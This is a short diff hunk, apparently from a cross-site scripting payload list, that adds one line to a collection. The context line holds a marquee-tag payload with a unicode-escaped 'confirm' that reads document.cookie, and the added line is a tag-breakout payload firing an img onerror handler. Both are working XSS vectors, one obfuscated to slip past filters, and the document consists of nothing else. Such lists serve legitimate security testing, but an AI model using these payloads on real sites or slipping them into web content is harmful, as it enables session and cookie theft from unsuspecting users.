@@ -15,3 +15,4 @@
 <marquee loop=1 width=0 onfinish=co\u006efirm(document.cookie)>XSS</marquee>
 
 
+'"></title></script><img src=x onerror=confirm(1)>
